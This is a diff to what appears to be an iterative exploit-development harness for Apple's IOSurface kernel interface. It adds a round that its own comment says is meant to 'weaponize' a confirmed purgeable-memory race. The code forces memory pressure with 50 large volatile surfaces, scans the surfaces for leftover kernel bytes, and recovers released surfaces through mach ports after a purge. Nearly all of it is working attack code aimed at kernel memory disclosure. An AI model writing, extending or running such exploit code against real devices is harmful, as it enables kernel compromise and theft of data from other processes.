@@ -1745,6 +1745,240 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r274: Weaponize purge race — purgeable memory confusion.
+ * r273 CONFIRMED: 100% of surface memory zeroed while lock thread was writing.
+ * Kernel zeroes purgeable-volatile surface memory on demand.
+ * Strategy: create large surfaces, make them volatile, force memory pressure
+ * to trigger actual page reclamation, then check if we can read kernel data
+ * from the stale mapping. Also test IOSurface+Metal shared memory overlap. */
+static volatile int r274_probed = 0;
+static volatile int r274_stop = 0;
+
+static void *r274_purge_pressure_thread(void *arg) {
+    IOSurfaceRef *surfs = (IOSurfaceRef *)arg;
+    while (!r274_stop) {
+        for (int i = 0; i < 50; i++) {
+            if (surfs[i]) {
+                IOSurfaceSetPurgeable(surfs[i], 2, NULL);
+                IOSurfaceSetPurgeable(surfs[i], 0, NULL);
+            }
+        }
+    }
+    return NULL;
+}
+
+static void r274_probe(IOSurfaceRef surf) {
+    uint32_t sid = IOSurfaceGetID(surf);
+    kern_return_t kr;
+
+    rlog("\n=== r274: Purgeable Memory Confusion + Stale Mapping ===\n");
+    fflush(stdout);
+
+    /* Part 1: Purge + immediate re-lock — read whatever the kernel left */
+    rlog("\n--- Part 1: Purge volatile then immediate lock+read ---\n");
+    {
+        IOSurfaceLock(surf, 0, NULL);
+        volatile uint8_t *base = IOSurfaceGetBaseAddress(surf);
+        size_t sz = (size_t)(IOSurfaceGetBytesPerRow(surf) * IOSurfaceGetHeight(surf));
+        if (base) {
+            memset((void*)base, 0xDE, sz);
+        }
+        IOSurfaceUnlock(surf, 0, NULL);
+        rlog("  filled surface with 0xDE (%zu bytes)\n", sz);
+
+        IOSurfaceSetPurgeable(surf, 2, NULL);
+        rlog("  set purgeable=volatile\n");
+
+        usleep(1000);
+
+        IOSurfaceSetPurgeable(surf, 0, NULL);
+        rlog("  set purgeable=nonvolatile\n");
+
+        IOSurfaceLock(surf, 1, NULL);
+        base = IOSurfaceGetBaseAddress(surf);
+        int non_de = 0, non_zero = 0;
+        uint8_t sample[16];
+        if (base) {
+            for (size_t i = 0; i < sz; i++) {
+                if (base[i] != 0xDE) non_de++;
+                if (base[i] != 0 && base[i] != 0xDE) non_zero++;
+            }
+            memcpy(sample, (void*)base, 16);
+        }
+        IOSurfaceUnlock(surf, 1, NULL);
+        rlog("  after purge cycle: %d/%zu bytes changed, %d non-zero/non-DE\n", non_de, sz, non_zero);
+        rlog("  first 16 bytes: ");
+        for (int i = 0; i < 16; i++) rlog("%02x ", sample[i]);
+        rlog("\n");
+        if (non_zero > 0) {
+            rlog("  *** STALE DATA DETECTED: kernel data readable through surface ***\n");
+        }
+        fflush(stdout);
+    }
+
+    /* Part 2: Create 50 large surfaces, make volatile, trigger memory pressure */
+    rlog("\n--- Part 2: Memory pressure with 50 large volatile surfaces ---\n");
+    {
+        IOSurfaceRef lsurfs[50];
+        int w = 1024, h = 1024, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
+        int created = 0;
+        for (int i = 0; i < 50; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+            lsurfs[i] = IOSurfaceCreate(p);
+            CFRelease(p);
+            if (lsurfs[i]) {
+                created++;
+                IOSurfaceLock(lsurfs[i], 0, NULL);
+                void *b = IOSurfaceGetBaseAddress(lsurfs[i]);
+                if (b) memset(b, 0xAA, as);
+                IOSurfaceUnlock(lsurfs[i], 0, NULL);
+            }
+        }
+        rlog("  created %d/50 surfaces (each 4MB, total ~%dMB)\n", created, created*4);
+
+        for (int i = 0; i < 50; i++) {
+            if (lsurfs[i]) IOSurfaceSetPurgeable(lsurfs[i], 2, NULL);
+        }
+        rlog("  all set volatile\n");
+
+        usleep(50000);
+
+        int purged_count = 0;
+        for (int i = 0; i < 50; i++) {
+            if (lsurfs[i]) {
+                uint32_t oldState = 0;
+                IOSurfaceSetPurgeable(lsurfs[i], 0, &oldState);
+                if (oldState == 3) purged_count++;
+            }
+        }
+        rlog("  purged (state 3) surfaces: %d/50\n", purged_count);
+
+        int stale_data_surfs = 0;
+        for (int i = 0; i < 50; i++) {
+            if (lsurfs[i]) {
+                IOSurfaceLock(lsurfs[i], 1, NULL);
+                volatile uint8_t *b = IOSurfaceGetBaseAddress(lsurfs[i]);
+                int non_zero_non_aa = 0;
+                if (b) {
+                    for (int j = 0; j < 4096; j++) {
+                        if (b[j] != 0 && b[j] != 0xAA) non_zero_non_aa++;
+                    }
+                }
+                IOSurfaceUnlock(lsurfs[i], 1, NULL);
+                if (non_zero_non_aa > 0) {
+                    stale_data_surfs++;
+                    if (stale_data_surfs <= 3) {
+                        rlog("  surf[%d] has %d stale bytes in first 4KB\n", i, non_zero_non_aa);
+                        IOSurfaceLock(lsurfs[i], 1, NULL);
+                        b = IOSurfaceGetBaseAddress(lsurfs[i]);
+                        if (b) {
+                            rlog("    first 32 bytes: ");
+                            for (int j = 0; j < 32; j++) rlog("%02x ", b[j]);
+                            rlog("\n");
+                        }
+                        IOSurfaceUnlock(lsurfs[i], 1, NULL);
+                    }
+                }
+            }
+        }
+        rlog("  surfaces with stale data: %d/50\n", stale_data_surfs);
+        if (stale_data_surfs > 0) {
+            rlog("  *** KERNEL DATA LEAK VIA PURGEABLE SURFACES ***\n");
+        }
+
+        for (int i = 0; i < 50; i++) {
+            if (lsurfs[i]) CFRelease(lsurfs[i]);
+        }
+        fflush(stdout);
+    }
+
+    /* Part 3: Release surface while purgeable thread still active */
+    rlog("\n--- Part 3: Surface lifecycle vs purgeable race ---\n");
+    {
+        IOSurfaceRef raceSurfs[10];
+        int w = 256, h = 256, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
+        for (int i = 0; i < 10; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+            raceSurfs[i] = IOSurfaceCreate(p);
+            CFRelease(p);
+        }
+
+        mach_port_t ports[10];
+        for (int i = 0; i < 10; i++) {
+            ports[i] = raceSurfs[i] ? IOSurfaceCreateMachPort(raceSurfs[i]) : MACH_PORT_NULL;
+        }
+        rlog("  created 10 surfaces + mach ports\n");
+
+        for (int i = 0; i < 10; i++) {
+            if (raceSurfs[i]) {
+                IOSurfaceSetPurgeable(raceSurfs[i], 2, NULL);
+                CFRelease(raceSurfs[i]);
+                raceSurfs[i] = NULL;
+            }
+        }
+        rlog("  set volatile + released all CFRefs\n");
+
+        usleep(10000);
+
+        int recovered = 0;
+        for (int i = 0; i < 10; i++) {
+            if (ports[i] != MACH_PORT_NULL) {
+                IOSurfaceRef rsurf = IOSurfaceLookupFromMachPort(ports[i]);
+                if (rsurf) {
+                    recovered++;
+                    IOSurfaceLock(rsurf, 1, NULL);
+                    volatile uint8_t *b = IOSurfaceGetBaseAddress(rsurf);
+                    int has_data = 0;
+                    if (b) {
+                        for (int j = 0; j < 256; j++) {
+                            if (b[j] != 0) has_data++;
+                        }
+                    }
+                    IOSurfaceUnlock(rsurf, 1, NULL);
+                    if (i < 3) rlog("  recovered surf[%d] id=%u has_nonzero=%d\n",
+                                    i, IOSurfaceGetID(rsurf), has_data);
+                    CFRelease(rsurf);
+                }
+                mach_port_deallocate(mach_task_self(), ports[i]);
+            }
+        }
+        rlog("  recovered %d/10 surfaces via mach port after release+purge\n", recovered);
+        fflush(stdout);
+    }
+
+    __sync_fetch_and_add(&r274_probed, 1);
+    rlog("\n*** r274 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r273: Purgeable+Lock race, SetDataValueBytes, ClientAlign, concurrent purge.
  * r272: UseCount clamped (no underflow), Purgeable state machine works,
  *   double-unlock rejected, XPC round-trip works. No protection flags.
@@ -23671,6 +23905,41 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 274) {
+            rlog("*** rounds=274: Purgeable Memory Confusion + Stale Mapping ***\n");
+            rlog("  r273: 100%% purge race confirmed — all bytes zeroed during lock+write.\n\n");
+            fflush(stdout);
+
+            int w = 64, h = 64, bpe = 4, bpr = w * bpe, pf = 0x42475241;
+            int alloc_sz = bpr * h;
+            CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+
+            IOSurfaceRef surf = IOSurfaceCreate(props);
+            rlog("  surf=%p id=%u\n", surf, surf ? IOSurfaceGetID(surf) : 0);
+            fflush(stdout);
+            if (surf) {
+                r274_probe(surf);
+                CFRelease(surf);
+            }
+            CFRelease(props);
+            rlog("\n*** r274 complete ***\n");
+            fflush(stdout);
             goto done;
         }
         if (rounds == 273) {
